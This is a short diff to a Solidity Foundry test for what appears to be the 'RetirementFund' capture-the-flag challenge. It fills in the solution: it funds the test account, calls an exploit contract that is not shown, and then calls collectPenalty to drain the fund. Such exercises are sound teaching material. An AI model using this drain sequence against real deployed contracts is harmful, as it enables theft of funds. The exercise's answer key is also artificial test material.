@@ -10,7 +10,7 @@ contract RetirementFundTest is Test {
 
     function setUp() public {
         // Deploy contracts
-        retirementFund = (new RetirementFund){value: 1 ether}(address(this));
+        retirementFund = (new RetirementFund){value: 1 ether}(address(this)); // Player and deployer should be dif?
         exploitContract = new ExploitContract(retirementFund);
     }
 
@@ -19,7 +19,9 @@ contract RetirementFundTest is Test {
         // Test your Exploit Contract below
         // Use the instance retirementFund and exploitContract
 
-        // Put your solution here
+        vm.deal(address(this), 1 ether);
+        exploitContract.exploit{value: 1 ether}();
+        retirementFund.collectPenalty();
 
         _checkSolved();
     }
